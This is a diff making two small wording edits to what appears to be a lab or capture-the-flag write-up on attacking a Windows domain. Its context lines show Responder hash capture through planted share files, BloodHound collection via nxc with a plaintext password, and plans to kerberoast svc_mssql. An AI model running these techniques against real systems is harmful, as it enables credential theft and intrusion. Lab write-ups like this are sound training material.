@@ -139,7 +139,7 @@ Run responder:
 ```
 > sudo responder  -I tun0 -w -r -d -F -P -v                        
 ```
-First, I tried putting the files in every writable directory from the `Users` share but no luck.
+First, I tried putting the files inside every writable directory from the `Users` share but no luck.
 The directory that gets accessed by the victim is either `software` or `transfer` inside the `share` share because once I started putting the files there, I got the hash.
 ```
 recurse on
@@ -160,7 +160,7 @@ Retrieve data for bloodhound through `nxc`:
 ```
 nxc ldap 10.10.99.155 -u julia.wong -p 'Computer1' --bloodhound -c All --dns-server 10.10.99.155
 ```
-Remembering that port 1433 was present and we know there is a user called `svc_mssql`. 
+Remember that port 1433 was present and we know there is a user called `svc_mssql`. 
 
 I tried to look for kerberoastable users, and we could perform kerberoast for `svc_mssql`.
 ```
